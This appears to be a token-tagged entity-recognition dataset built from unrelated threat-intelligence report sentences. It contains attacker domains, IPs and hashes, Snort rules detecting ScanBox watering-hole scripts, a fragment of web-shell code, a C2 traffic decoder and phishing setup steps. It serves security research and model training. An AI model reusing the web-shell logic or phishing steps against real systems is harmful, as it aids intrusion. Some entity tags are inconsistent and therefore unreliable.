Darkhotel O
's O
attacks O
in O
2015 O
The O
Chronicles O
of O
the O
Hellsing O
APT O
: O
the O
Empire O
Strikes O
Back O

These O
files O
were O
received O
in O
intervals O
through O
the O
fall O
and O
summer O
, O
going O
back O
to O
May O
2012 O
, O
and O
reveal O
more O
hints O
about O
targets O
. O

Register O
a O
domain O
spoofing O
a O
webmail O
service O
or O
an O
organization O
's O
webmail O
portal O
( O
e.g. O
, O
0nedrive-0ffice365[.]com B-url.unknown
) O
Send O
exploit O
document O
to O
victim O
. O

The O
campaign O
we O
discovered O
showcases O
a O
clear O
use O
of O
Lazarus O
TTPs O
to O
target O
cryptocurrency O
exchanges O
and O
social O
institutions O
in O
South O
Korea O
. O

The O
use O
of O
low­key O
file­sharing O
sites O
appears O
to O
be O
a O
feature O
of O
the O
campaign O
as O
far O
as O
we O
can O
tell O
, O
with O
a O
few O
other O
similar O
sites O
being O
used O
in O
the O
same O
way O
. O

Attacks O
have O
continued O
since O
then O
, O
right O
through O
to O
2017 O
. O

area.wthelpdesk(.)com B-url.unknown
cdn.incloud-go(.)com B-url.unknown
center.shenajou(.)com B-url.unknown
commissioner.shenajou(.)com B-url.unknown
development.shenajou(.)com B-url.unknown
dick.ccfchrist(.)com B-url.unknown
document.shenajou(.)com B-url.unknown
download.windowsupdate.dedgesuite(.)net B-url.unknown
edgar.ccfchrist(.)com B-url.unknown
ewe.toshste(.)com B-url.unknown
fabian.ccfchrist(.)com B-url.unknown
flea.poulsenv(.)com B-url.unknown
foal.wchildress(.)com B-url.unknown
fukuoka.cloud-maste(.)com B-url.unknown
gavin.ccfchrist(.)com B-url.unknown
glicense.shenajou(.)com B-url.unknown
hamiltion.catholicmmb(.)com B-url.unknown
hukuoka.cloud-maste(.)com B-url.unknown
images.tyoto-go-jp(.)com B-url.unknown
interpreter.shenajou(.)com B-url.unknown
james.tffghelth(.)com B-url.unknown
kawasaki.cloud-maste(.)com B-url.unknown
kawasaki.unhamj(.)com B-url.unknown
kennedy.tffghelth(.)com B-url.unknown
lennon.fftpoor(.)com B-url.unknown
license.shenajou(.)com B-url.unknown
lion.wchildress(.)com B-url.unknown
lizard.poulsenv(.)com B-url.unknown
malcolm.fftpoor(.)com B-url.unknown
ms.ecc.u-tokyo-ac-jp(.)com B-url.unknown
msn.incloud-go(.)com B-url.unknown
sakai.unhamj(.)com B-url.unknown
sappore.cloud-maste(.)com B-url.unknown
sapporo.cloud-maste(.)com B-url.unknown
scorpion.poulsenv(.)com B-url.unknown
shrimp.bdoncloud(.)com B-url.unknown
sindeali(.)com B-url.unknown
style.u-tokyo-ac-jp(.)com B-url.unknown
trout.belowto(.)com B-url.unknown
ukuoka.cloud-maste(.)com B-url.unknown
v4.windowsupdate.dedgesuite(.)net B-url.unknown
vmmini(.)com B-url.unknown
whale.toshste(.)com B-url.unknown
windowsupdate.dedgesuite(.)net B-url.unknown
windowsupdate.wcwname(.)com B-url.unknown
www.cloud-maste(.)com B-url.unknown
www.foal.wchildress(.)com B-url.unknown
www.fukuoka.cloud-maste(.)com B-url.unknown
www.incloud-go(.)com B-url.unknown
www.kawasaki.cloud-maste(.)com B-url.unknown
www.kawasaki.unhamj(.)com B-url.unknown
www.lion.wchildress(.)com B-url.unknown
www.msn.incloud-go(.)com B-url.unknown
www.sakai.unhamj(.)com B-url.unknown
www.sapporo.cloud-maste(.)com B-url.unknown
www.unhamj(.)com B-url.unknown
www.ut-portal-u-tokyo-ac-jp.tyoto-go-jp(.)com B-url.unknown
www.vmmini(.)com B-url.unknown
www.wchildress(.)com B-url.unknown
www.yahoo.incloud-go(.)com B-url.unknown
yahoo.incloud-go(.)com B-url.unknown
zebra.bdoncloud(.)com B-url.unknown
zebra.incloud-go(.)com B-url.unknown
zebra.wthelpdesk(.)com B-url.unknown

Hash O

The O
packet O
structure O
still O
implements O
the O
same O
13-byte O
header O
format O
, O
including O
the O
starting O
zlib O
compression O
bytes O
of O
' O
78 O
9C O
' O
: O

In O
the O
malware O
, O
if O
a O
domain O
is O
configured O
, O
it O
will O
retrieve O
domain.tld/myip.txt O
. O

About O
Symantec O

Several O
victims O
allege O
that O
they O
have O
been O
physically O
followed O
, O
had O
their O
homes O
broken O
into O
, O
and O
been O
tracked O
using O
GPS O
devices O
. O

In O
2013 O
, O
it O
was O
reported O
that O
Frutas B-malware.infosteal
RAT I-malware.infosteal
was O
used O
in O
phishing O
email O
campaigns O
against O
high O
profile O
companies O
in O
Europe O
and O
Asia O
in O
sectors O
such O
as O
finance O
, O
mining O
, O
telecom O
, O
and O
government O
2 O
. O

We O
have O
no O
knowledge O
on O
the O
identity O
of O
the O
target O
, O
but O
we O
can O
assume O
he O
might O
part O
of O
the O
Vietnamese O
academic O
community O
. O

This O
claim O
is O
supported O
by O
the O
language O
used O
in O
the O
spear-phishing O
emails O
, O
which O
appear O
to O
be O
written O
by O
native O
speakers O
. O

Claudio O
Guarnieri O
at O
Rapid7 O
( O
one O
of O
the O
authors O
of O
this O
report O
) O
was O
the O
first O
to O
search O
for O
these O
servers O
. O

Introduction O

1 O
* O
http://news.grouptumbler.com/news/feed.php O
? O

We O
examined O
the O
behavior O
of O
the O
command O
and O
control O
domains O
used O
by O
Operation B-malware.ransom
Manul I-malware.ransom
as O
they O
moved O
from O
IP O
to O
IP O
. O

Decoded O
traffic O
: O

Wpscan O
— O
a O
WordPress O
vulnerability O
scanner O
that O
uses O
the O
blackbox O
principle O
, O
i.e. O
, O
works O
without O
access O
to O
the O
source O
code O
. O

Over O
the O
last O
few O
weeks O
, O
the O
Check O
Point O
Threat O
Intelligence O
Team O
discovered O
the O
comeback O
of O
an O
APT O
surveillance O
attack O
against O
institutions O
across O
the O
Middle O
East O
, O
specifically O
the O
Palestinian O
Authority O
. O

Multiple O
C O
& O
Cs O
can O
be O
delimited O
with O
the O
' O
| O
' O
character O
. O

125.214.195.17 B-ip.unknown
196.29.166.218 B-ip.unknown

In O
summer O
2015 O
, O
an O
APT29 B-malware.backdoor
spearphishing O
campaign O
directed O
emails O
containing O
a O
malicious O
link O
to O
over O
1,000 O
recipients O
, O
including O
multiple O
U.S. O
Government O
victims O
. O

An O
employee O
at O
the O
U.S. O
Department O
of O
State O
( O
state.gov O
) O
. O

+23 O
in O
new O
version O
Fingerprint O
Sets O
the O
session O
ID O
Creates O
a O
process O
and O
gets O
the O
output O
( O
using O
pipes O
) O
Sets O
the O
connection O
retry O
counter O
Delays O
polling O
time O
Reads O
a O
file O
or O
registry O
key O
and O
computes O
the O
MD5 O
Creates O
a O
process O
Creates O
a O
file O
, O
a O
registry O
entry O
or O
a O
stream O
in O
memory O
Writes O
to O
the O
registry O
Queries O
the O
registry O
Searches O
for O
files O
on O
the O
system O
Moves O
files O
to O
another O
directory O
Deletes O
files O
from O
the O
disk O
List O
the O
drives O
mapped O
on O
the O
system O
using O
the O

Second O
stage O
DLL O
internal O
name O
and O
export O

The O
Poseidon B-malware.infosteal
Group O
actively O
targets O
this O
sort O
of O
corporate O
environment O
for O
the O
theft O
of O
intellectual O
property O
and O
commercial O
information O
, O
occasionally O
focusing O
on O
personal O
information O
on O
executives O
. O

[ O
% O
path O
to O
the O
application O
's O
executable O
file O
% O
: O
' O
% O
window O
title O
% O
' O
] O

T O
he O
Sonypsps[.]com B-url.unknown
domain O
was O
last O
updated O
using O
GoDaddy O
on O
2017 O
-05-05 O
until O
2019-03-13 O
. O

15 O
Sept O
. O

Until O
now O
this O
component O
was O
only O
available O
for O
Windows O
, O
Linux O
and O
iOS O
operating O
systems O
. O

This O
decryption O
key O
immediately O
follows O
the O
length O
field O
. O

Data O
written O
to O
the O
files O
is O
encrypted O
using O
AES-256-CBC O
( O
with O
no O
padding O
) O
. O

The O
predefined O
groups O
of O
application O
names O
retrieved O
from O
the O
hardcoded O
configuration O
data O
set O
the O
scope O
of O
Babar O
's O
hooking O
advances O
: O
Internet O
communication O
File O
creation O
Media O
The O
respective O
trampolines O
steal O
data O
going O
in O
or O
out O
of O
the O
hooked O
APIs O
on O
the O
fly O
. O

[ O
그림 O
7 O
] O
원격 O
실행 O
명령어 O
중앙관리 O
솔루션 O
B의 O
취약점을 O
이용한 O
공격은 O
2015년부터 O
2017년까지 O
존재했다 O
. O

getCryptoRawPacket O
] O

Jobwork1.php O
or O
Jobwork2.php O
, O
if O
the O
C2 O
response O
satisfies O
the O
condition O
then O
it O
downloads O
& O
executes O
the O
file O
. O

XtremeRAT B-malware.backdoor
backdoors O
maintain O
and O
reference O
configuration O
data O
that O
was O
chosen O
by O
the O
attacker O
at O
the O
time O
they O
were O
built O
. O

The O
X-Agent B-malware.infosteal
Android O
variant O
does O
not O
exhibit O
a O
destructive O
function O
and O
does O
not O
interfere O
with O
the O
function O
of O
the O
original O
30.apk B-malware.backdoor
application O
. O

Their O
malware O
samples O
are O
present O
in O
the O
same O
cluster O
: O

Install O

Register O
a O
domain O
spoofing O
that O
of O
a O
legitimate O
organization O
( O
e.g. O
, O
theguardiannews[.]org O
) O
. O

The O
backdoor O
has O
the O
ability O
to O
enumerate O
processor O
, O
memory O
, O
drive O
, O
and O
volume O
information O
, O
execute O
commands O
directly O
from O
the O
attacker O
, O
enumerate O
and O
remove O
files O
and O
folders O
, O
and O
upload O
and O
download O
files O
. O

Examination O
of O
network O
traffic O
also O
identifies O
the O
implant O
as O
ShadowTech B-malware.infosteal
RAT I-malware.infosteal
. O

7 O
. O

The O
malware O
attempts O
to O
download O
a O
remote O
file O
called O
' O
123.functions B-malware.backdoor
' O
: O

Figure O
2 O
. O

They O
were O
submitted O
on O
the O
same O
date O
they O
were O
last O
saved O
. O

The O
provided O
information O
can O
also O
help O
inform O
ongoing O
intelligence O
analyses O
and O
forensic O
investigations O
, O
particularly O
for O
compromise O
discovery O
, O
damage O
assessment O
, O
and O
attribution O
. O

Next O
, O
the O
code O
uses O
the O
IsValidUser O
( O
) O
method O
and O
checks O
the O
Hyper O
Text O
Transport O
Protocol O
( O
HTTP O
) O
headers O
for O
the O
Keep-Alive O
value O
, O
which O
, O
if O
equal O
to O
320 O
, O
will O
return O
true O
. O

This O
script O
is O
embedded O
in O
the O
' O
upnphost.exe O
' O
file O
as O
resource O
, O
and O
, O
when O
it O
is O
launched O
, O
it O
communicates O
with O
this O
other O
server O
in O
HTTPS O
, O
sending O
some O
information O
about O
the O
victim O
's O
computer O
. O

Here O
is O
an O
example O
of O
a O
spearphishing O
email O
sent O
to O
one O
of O
the O
biggest O
Forex-trading O
companies O
: O
Roughly O
translated O
from O
Russian O
to O
English O
, O
it O
says O
: O

Sample O
lure O
document O
used O
in O
the O
new O
campaign O

Throughout O
our O
investigation O
, O
we O
observed O
several O
malicious O
documents O
used O
to O
attack O
victims O
, O
which O
we O
will O
discuss O
. O

Size O

The O
HIGHTIDE B-malware.backdoor
backdoor O
connected O
directly O
to O
141.108.2.157 B-ip.unknown
. O

caidao.exe O
5001ef50c7e869253a7c152a638eab8a B-hash

ed65bbe9498d3fb1e4d4ac0058590d88 O

Therefore O
, O
in O
order O
to O
provide O
additional O
security O
, O
user O
interface O
objects O
are O
managed O
using O
window O
stations O
and O
desktops O
, O
which O
themselves O
are O
securable O
objects O
. O
' O
. O

This O
is O
internally O
called O
' O
yay_release.dll O
' O
: O

Observe O
the O
size O
of O
the O
file O
above O
. O

ToString O
( O
) O
) O
) O
; O
catch O
( O
Exception O
) O
Page.Visible O
= O
false O
; O
Response.End O
( O
) O
; O
private O
void O
Init O
( O
) O
if O
( O
Request.Cookies O
[ O
' O
cp O
' O
] O
! O
= O
null O
) O
File.Copy O
( O
Request.PhysicalPath O
, O
Request.Cookies O
[ O
' O
cp O
' O
] O
.Value O
, O
true O
) O
; O
Response.Cookies O
[ O
' O
cp O
' O
] O
.Expires O
= O
DateTime.Now.AddDays O
( O
-1 O
) O
; O
Response.End O
( O
) O
; O
catch O
( O
Exception O
ex O
) O
Log O
( O
ex O
. O

ACTIONABLE O
INTELLIGENCE O

14 O

The O
only O
legible O
, O
sensible O
decoy O
document O
observed O
so O
far O
is O
revealing O
of O
the O
interests O
of O
at O
least O
one O
of O
the O
targets O
of O
this O
campaign O
: O
namely O
the O
military O
threat O
of O
Pakistan O
against O
India O
and O
its O
growing O
relationships O
with O
other O
countries O
including O
China O
. O

Recipient O
visits O
fake O
login O
page O
Person O
is O
asked O
to O
authorize O
and O
enters O
credentials O
. O

Most O
times O
, O
we O
are O
able O
to O
detect O
the O
threats O
in O
no O
more O
than O
a O
few O
hours O
. O

These O
are O
the O
accounts O
: O
Account O
Name O
Account O
Password O

2 O
. O

Evasion O
based O
on O
CPU O
core O
detection O

If O
the O
value O
of O
key O
is O
zero O
, O
this O
is O
a O
keyless O
entry O
and O
only O
carries O
a O
value O
. O
' O

The O
Framework O
enables O
entities O
, O
regardless O
of O
size O
, O
degree O
of O
cyber O
risk O
, O
or O
cyber O
sophistication O
, O
to O
apply O
principles O
and O
best O
practices O
of O
risk O
management O
to O
improve O
the O
security O
and O
resiliency O
of O
critical O
infrastructure O
. O

Similarly O
, O
the O
public O
disclosure O
of O
APT12 O
's O
intrusion O
at O
the O
New O
York O
Times O
also O
led O
to O
only O
a O
brief O
pause O
in O
the O
threat O
group O
's O
activity O
and O
immediate O
changes O
in O
TTPs O
. O

Jonathan O
A.P. O
Marpaung O
, O
HoonJae O
Lee O

. O

Figure O
2 O
: O
Enable O
macros O
One O
of O
the O
malicious O
XLSM O
attachments O
that O
we O
observed O
contained O
a O
macro O
that O
: O
1 O
. O

해당 O
스크립트는 O
인자로 O
입력된 O
주소로부터 O
파일을 O
다운로드한 O
다음 O
5바이트를 O
복구한다 O
. O

This O
causes O
problems O
during O
decompilation O
due O
to O
the O
use O
of O
positive O
stack O
pointer O
values O
. O

' O
Lipton O
, O
Eric O
. O

This O
assessment O
should O
not O
be O
considered O
an O
attempt O
to O
aid O
or O
assess O
in O
true O
attribution O
of O
the O
responsible O
party O
, O
but O
rather O
an O
attempt O
to O
provide O
relevant O
targeting O
information O
for O
analysts O
to O
associate O
with O
a O
known O
activity O
group O
or O
campaign O
. O

alert O
tcp O
$ O
EXTERNAL_NET O
any O
- O
> O
$ O
HOME_NET O
any O
( O
msg O
: O
' O
-- O
[ O
PwC O
CTD O
] O
-- O
MultiGroup O
- O
ScanBox B-malware.infosteal
and O
Targetted O
Watering O
Holes O
Content O
( O
plugin_pdf_ie O
( O
) O
) O
' O
; O
flow O
: O
established O
, O
from_server O
; O
file_data O
; O
content O
: O
' O
plugin_pdf_ie O
( O
) O
' O
; O
classtype O
: O
trojan-activity O
; O
reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html B-url.normal
; I-url.normal
metadata O
: O
tlp O
WHITE O
, O
author O
CDD O
; O
sid O
: O
xxxxxx O
; O
rev:2015021901 O
; O
) O
alert O
tcp O
$ O
EXTERNAL_NET O
any O
- O
> O
$ O
HOME_NET O
any O
( O
msg O
: O
' O
-- O
[ O
PwC O
CTD O
] O
-- O
MultiGroup O
- O
ScanBox B-malware.infosteal
Watering O
Hole O
Content O
( O
.item O
( O
0 O
) O
.appendChild O
( O
iframe_tag O
) O
) O
' O
; O
flow O
: O
established O
, O
from_server O
; O
file_data O
; O
content:'.item O
( O
0 O
) O
.appendChild O
( O
iframe_tag O
) O
' O
; O
classtype O
: O
trojan-activity O
; O
reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html O
; O
metadata O
: O
tlp O
WHITE O
, O
author O
CDD O
; O
sid O
: O
xxxxxx O
; O
rev:2015021901 O
; O
) O
alert O
tcp O
$ O
EXTERNAL_NET O
any O
- O
> O
$ O
HOME_NET O
any O
( O
msg O
: O
' O
-- O
[ O
PwC O
CTD O
] O
-- O
MultiGroup O
- O
ScanBox B-malware.infosteal
and O
Targetted O
Watering O
Holes O
Content O
( O
var O
version\ O
; O
var O
ax\ O
; O
var O
e\ O
; O
try O
{ O
axo=new O
ActiveXObject O
) O
' O
; O
flow O
: O
established O
, O
from_server O
; O
file_data O
; O
content O
: O
' O
var O
version\ O
; O
var O
ax\ O
; O
var O
e\ O
; O
try O
{ O
axo=new O
ActiveXObject O
' O
; O
reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html O
; O
metadata O
: O
tlp O
WHITE O
, O
author O
CDD O
; O
sid O
: O
xxxxxx O
; O
rev:2015021901 O
; O
) O
alert O
tcp O
$ O
EXTERNAL_NET O
any O
- O
> O
$ O
HOME_NET O
any O
( O
msg O
: O
' O
-- O
[ O
PwC O
CTD O
] O
-- O
MultiGroup O
- O
ScanBox B-malware.infosteal
Watering O
Hole O
Content O
( O
document.getElementsByTagName O
( O
' O
head O
' O
) O
.item O
( O
0 O
) O
.appendChild O
( O
form_tag O
) O
\ O
; O
) O
' O
; O
flow O
: O
established O
, O
from_server O
; O
file_data O
; O
content:'document.getElementsByTagName O
( O
' O
head O
' O
) O
.item O
( O
0 O
) O
.appendChild O
( O
form_tag O
) O
\ O
; O
' O
; O
classtype O
: O
trojan-activity O
; O
reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html O
; O
metadata O
: O
tlp O
WHITE O
, O
author O
CDD O
; O
sid O
: O
xxxxxx O
; O
rev:2015021901 O
; O
) O
alert O
tcp O
$ O
EXTERNAL_NET O
any O
- O
> O
$ O
HOME_NET O
any O
( O
msg O
: O
' O
-- O
[ O
PwC O
CTD O
] O
-- O
MultiGroup O
- O
ScanBox B-malware.infosteal
Watering O
Hole O
Content O
( O
return O
( O
( O
! O
a O
) O
? O

cylance.com B-url.normal
/en_us/blog/the-deception-project-a-new-japanese-centric-threat.html I-url.normal
In O
an O
effort O
to O
expose O
a O
common O
problem O
we O
see O
happening O
in O
the O
industry O
, O
Cylance® O
would O
like O
to O
shed O
some O
light O
on O
just O
how O
easy O
it O
is O
to O
fake O
attribution O
. O

application O
is O
likely O
only O
the O
initial O
iteration O
of O
this O
type O
of O
malware O
. O

dropper O
- O
> O
wsh O
script O
- O
> O
wsh O
script O
- O
> O
info O
stealer O
- O
> O
more O
compiled O
components O
spearphish O
- O
> O
dropper O
- O
> O
hta O
checkin O
- O
> O
downloader O
- O
> O
info O
stealer O
While O
a O
chain O
of O
delivery O
that O
includes O
obfuscated O
scripts O
within O
.hta O
files O
occurred O
as O
far O
back O
as O
2011 O
, O
the O
volume O
appears O
to O
have O
picked O
up O
in O
2014 O
and O
now O
2015 O
. O

If O
this O
failed O
, O
trilog.exe O
attempted O
to O
write O
a O
small O
' O
dummy O
' O
program O
to O
memory O
. O

After O
decoding O
the O
parameters O
, O
we O
obtain O
the O
IP O
address O
, O
the O
path O
and O
the O
user O
agent O
used O
to O
contact O
the O
C O
& O
C O
and O
send O
back O
the O
information O
about O
the O
target O
system O
. O

While O
you O
would O
virtually O
never O
see O
Western O
intelligence O
agencies O
going O
after O
the O
same O
target O
without O
de-confliction O
for O
fear O
of O
compromising O
each O
other O
's O
operations O
, O
in O
Russia O
this O
is O
not O
an O
uncommon O
scenario O
. O

CNN O
. O

C21D7165B25CAF65D7F92FF758C1B5B1 B-hash
skype.servemp3.com B-url.cncsvr

Forensic O
artifacts O
revealed O
that O
the O
attackers O
persisted O
on O
the O
network O
for O
at O
least O
a O
year O
before O
Cybereason O
was O
deployed O
. O

A O
few O
times O
a O
year O
the O
authors O
compile O
a O
new O
version O
of O
a O
driver O
file O
, O
creating O
a O
reference O
file O
. O

The O
log O
messages O
are O
abbreviated O
strings O
that O
describe O
specific O
activities O
during O
the O
execution O
of O
the O
code O
. O

It O
collects O
most O
of O
the O
available O
information O
about O
the O
system O
, O
transmits O
it O
to O
the O
C O
& O
C O
server O
and O
executes O
the O
commands O
it O
receives O
back O
. O

This O
is O
most O
likely O
performed O
via O
a O
social O
engineering O
mechanism O
, O
i.e. O
a O
fake O
tech O
support-style O
call O
. O

In O
this O
campaign O
we O
identified O
three O
compromised O
versions O
of O
apps O
using O
this O
trick O
hosted O
on O
the O
MDM B-malware.infosteal
server O
. O

File O
size O
: O
168776 O
bytes O

29 O
July O
2016 O
. O

Since O
it O
is O
a O
very O
long O
term O
group O
, O
some O
victims O
may O
be O
impossible O
to O
identify O
now O
. O

It O
is O
possible O
that O
some O
of O
the O
non-Indian O
IP O
space O
requests O
may O
artefacts O
be O
due O
to O
our O
own O
research O
. O

Keyword O
searches O
revealed O
that O
there O
were O
still O
files O
that O
would O
be O
recoverable O
on O
the O
system O
. O

Reverse O
engineering O
both O
the O
word O
documents O
( O
Uri O
Terror O
Report.doc O
& O
mha-report.doc O
) O
exhibited O
similar O
behaviour O
except O
the O
minor O
difference O
mentioned O
below O
. O

SUSPICIOUS O
POWERSHELL O
USAGE O
( O
METHODOLOGY O
) O
HX O
Detect O
XSLM O
Macro O
launch O
Gen:Variant.Application.HackTool.CobaltStrike.1 O
Malware O
Object O
Backdoor.BEACON O
FE_Malformed_RTF O
Malware.Binary.rtf O
Malware.Binary O
Malware.Binary.xlsx O
Table O
1 O
: O
Detection O
review O

The O
original O
means O
of O
infection O
is O
unknown O
, O
though O
we O
believe O
Dino B-malware.backdoor
was O
installed O
by O
another O
program O
, O
as O
it O
contains O
an O
uninstallation O
command O
without O
the O
corresponding O
installation O
procedure O
. O

The O
Islamic O
Republic O
has O
abandoned O
its O
typically O
deliberate O
and O
methodical O
approach O
to O
cyber O
operations O
on O
only O
two O
known O
occasions O
, O
in O
2012 O
and O
in O
2014 O
, O
when O
a O
quick O
reactionary O
response O
was O
required O
. O

While O
investigating O
the O
malware O
's O
uninstall/delete O
functionality O
it O
was O
determined O
that O
malware O
creates O
a O
batch O
script O
to O
delete O
all O
its O
files O
but O
before O
deleting O
all O
the O
files O
it O
pings O
10 O
times O
to O
an O
hard O
coded O
IP O
address O
180[.]92[.]154[.]176 B-ip.unknown

Figure O
1 O
. O

Vulnerability O

Dino B-malware.backdoor
contains O
a O
custom O
file O
system O
named O
' O
ramFS O
' O
by O
its O
developers O
. O

As O
a O
result O
, O
we O
've O
only O
included O
recent O
Dynamic O
DNS O
domains O
that O
were O
connected O
to O
recently O
registered O
infrastructure O
. O

3.1 O
. O

def O
rolling_xor O
( O
buf O
, O
key O
) O
: O
out O
= O
' O
' O
k O
= O
0 O
for O
i O
in O
buf O
: O
if O
k O
== O
len O
( O
key O
) O
: O
k O
= O
0 O
out O
+= O
chr O
( O
ord O
( O
i O
) O
^ O
ord O
( O
key O
[ O
k O
] O
) O
) O
k O
+= O
1 O
return O
out O
req O
= O
' O
p*hWe8J5pF*k5xv5XeUhIJbKZQfySZRv1NcwhQi2ZHKKvGBC8EjiadbWLoUcgUxJyZElD7AY0DCWmzbIa9I O
XEJ7OZkvwBZVx1JsrhQ== O
' O
unb64 O
= O
base64.b64decode O
( O
req O
, O
' O
+* O
' O
) O
dec O
= O
rolling_xor O
( O
unb64 O
[ O
16 O
: O
: O
] O
, O
unb64 O
[ O
0:16 O
] O
) O
print O
dec O

Last O
year O
, O
malware O
which O
purported O
to O
be O
the O
Tor B-malware.drop
Browser I-malware.drop
Bundle I-malware.drop
was O
found O
in O
the O
wild O
. O

Parser O
: O
:inBytes O
method O
clientID O
equals O
the O
following O
sequence O
of O
bytes O
B4 O
B1 O
47 O
BC O
52 O
28 O
28 O
73 O
1F O
1A O
01 O
6B O
FA O
72 O
C0 O
73 O
, O
then O
the O
scrambled O
version O
is O
computed O
using O
the O
third O
parameter O
( O
0x10 O
) O
, O
which O
is O
treated O
as O
a O
DWORD O
. O

Information O
about O
travel O
plans O
and O
campaign O
scheduling O
could O
provide O
short-term O
opportunities O
for O
other O
intelligence O
operations O
. O

Trend O
Micro O
disclaims O
all O
warranties O
of O
any O
kind O
, O
express O
or O
implied O
. O

Clever O
investigators O
may O
think O
that O
they O
can O
spot O
the O
suspicious O
file O
due O
to O
the O
creation O
date O
being O
changed O
to O
the O
same O
date O
as O
the O
modified O
date O
. O

As O
far O
as O
any O
of O
them O
know O
, O
and O
it O
stands O
to O
reason O
that O
they O
would O
, O
there O
has O
never O
been O
a O
case O
of O
a O
large-scale O
attack O
utilizing O
numerous O
zero-day O
exploits O
that O
were O
so O
thoroughly O
mapped O
in O
advance O
before O
. O

During O
our O
research O
, O
we O
discovered O
a O
cached O
Apache O
server O
log O
for O
the O
IP O
address O
81.31.47.101 B-ip.unknown
, O
which O
is O
shared O
hosting O
. O

Even O
the O
individual O
Linux O
modules O
renamed O
as O
' O
Fysbis O
' O
backdoors O
released O
in O
2016 O
were O
merely O
modified O
and O
reduced O
portions O
of O
recompiled O
XAgent B-malware.backdoor
C/C++ O
codebase O
. O

The O
Mac O
version O
shares O
multiple O
similarities O
with O
those O
designed O
for O
other O
operating O
systems O
. O

Self-extracting O

A O
200.63.46.23 B-ip.unknown
4 O
dexterseason.com B-url.unknown
. O

Taken O
together O
, O
FinSpy B-malware.backdoor
servers O
are O
currently O
, O
or O
have O
been O
present O
, O
in O
25 O
countries O
. O

Let O
them O
know O
. O

This O
means O
the O
security O
company O
that O
releases O
a O
detailed O
report O
documenting O
the O
campaign O
is O
aware O
of O
it O
long O
before O
the O
information O
is O
made O
public O
. O

The O
use O
of O
an O
exploit O
for O
a O
security O
flaw O
disclosed O
in O
December O
2017 O
and O
their O
recent O
activities O
suggest O
Confucius O
is O
keenly O
trailing O
their O
targets O
. O

Interesting O
Artifacts O
and O
Observations O

The O
group O
has O
quietly O
deployed O
zero-day O
in O
the O
past O
, O
effectively O
spearphished O
targets O
, O
and O
maintains O
a O
modular O
toolset O
. O

FIGURE O
4 O
: O
TIMELINE O
OF O
COZYDUKE B-malware.drop
EVOLUTION O

' O
How O
Hackers O
Broke O
Into O
John O
Podesta O
and O
Colin O
Powell O
's O
Gmail O
Accounts O
. O
' O

delete O
name O

Lastly O
, O
our O
research O
provides O
an O
important O
testimony O
to O
the O
capabilities O
and O
working O
methods O
of O
the O
OceanLotus O
Group O
. O

cleaned.exe O
cbkp1vpsv1y.exe O
jnpqmri1aus.exe O
gzch5y2cyne.exe O
retn0gzbksd.lnk O
pktkvkgj4bl.lnk O
Intelligence O
agencies O
succeeding O
in O
penetrating O
Hezbollah.exe O

Figure O
6 O
: O
Pseudo-code O
for O
CalculateFunctionHash O
With O
these O
hash O
values O
calculated O
for O
the O
DUBNIUM B-malware.drop
binary O
, O
we O
can O
compare O
these O
values O
with O
the O
hash O
values O
from O
the O
original O
OpenSSL O
library O
. O

Analysis O
details O
and O
testing O
of O
an O
available O
sample O
of O
Shamoon B-malware.unknown
by O
General O
Dynamics O
Fidelis O
Cybersecurity O
Solutions O
researchers O
revealed O
that O
the O
malware O
's O
wipe O
operations O
did O
not O
overwrite O
entire O
disks O
, O
but O
rather O
overwrote O
enough O
to O
prevent O
access O
to O
the O
affected O
file O
systems O
, O
along O
with O
substantial O
amounts O
of O
file O
data O
. O

Accevent.exe O
< O
- O
> O
Microsoft O
Accessible O
Event O
Watcher O
7.2.0.0 O
event.dll O
< O
- O
> O
the O
loader O
of O
ssssss.ddd O
, O
( O
Detected O
as O
TROJ_ANELLDR B-malware.backdoor
) O
ssssss.ddd O
( O
lena_http.bin O
) O
< O
- O
> O
encrypted O
BKDR_ANEL B-malware.backdoor
( O
Detected O
as O
BKDR_ANELENC B-malware.backdoor
) O

The O
email O
contained O
a O
malicious O
Trojan O
downloader O
which O
the O
researchers O
report O
to O
have O
been O
detected O
by O
their O
Deep O
Discovery O
software O
. O

0x406ECC O
: O
80277F O
AND O
BYTE O
PTR O
[ O
EDI O
] O
,0x7F O

We O
can O
use O
similar O
techniques O
to O
explore O
other O
actors O
who O
have O
the O
same O
tasking O
as O
Cluster O
1 O
. O

It O
is O
composed O
of O
a O
DustySky B-malware.drop
dropper O
, O
DustySky B-malware.drop
core O
, O
and O
the O
DustySky B-malware.drop
keylogging O
component O
. O

Several O
other O
details O
have O
been O
uncovered O
which O
suggest O
there O
was O
possibly O
at O
least O
one O
further O
spyware O
module O
based O
on O
the O
same O
platform O
in O
2007-2008 O
, O
and O
several O
other O
programs O
whose O
functionality O
was O
unclear O
between O
2008 O
and O
2010 O
. O

These O
unique O
traces O
assisted O
us O
in O
correlating O
the O
current O
wave O
to O
past O
attacks O
, O
and O
may O
also O
have O
some O
resemblance O
to O
attacks O
related O
to O
the O
Gaza O
Cybergang O
APT O
group O
. O

In O
July O
, O
the O
DCCC O
announced O
that O
it O
was O
investigating O
an O
ongoing O
' O
cybersecurity O
incident O
' O
that O
the O
FBI O
believed O
was O
linked O
to O
the O
compromise O
of O
the O
DNC O
. O

Stolen O
certificates O
and O
evasion O

The O
following O
figure O
shows O
the O
code O
that O
checks O
for O
the O

Decoding O
the O
' O
config.json O
' O
file O
using O
base64 O
decoder O
shows O
that O
the O
C2 O
hostname/domain O
is O
: O

00B9FD24 O
25 O
48 O
29 O
48 O
21 O
48 O
24 O
48 O
66 O
48 O
2B O
48 O
2A O
48 O
38 O
48 O
% O
H O
) O
H O
! O
H O
$ O
HfH+H*H8H O
00B9FD34 O
38 O
48 O
26 O
48 O
2D O
48 O
3F O
48 O
3B O
48 O
66 O
48 O
2B O
48 O
27 O
48 O
8H O
& O
H-H O
? O
H O
; O
HfH+H'H O
00B9FD44 O
25 O
48 O

Users O
are O
granted O
permission O
to O
copy O
and/or O
distribute O
this O
document O
in O
its O
original O
electronic O
form O
and O
print O
copies O
for O
personal O
use O
. O

Volume O
percent O
of O
C O
& O
C O
server O
activity O
per O
country O

A O
SIS O
is O
an O
autonomous O
control O
system O
that O
independently O
monitors O
the O
status O
of O
the O
process O
under O
control O
. O

dns.apasms.com B-url.unknown
ns.gpass1.org B-url.unknown
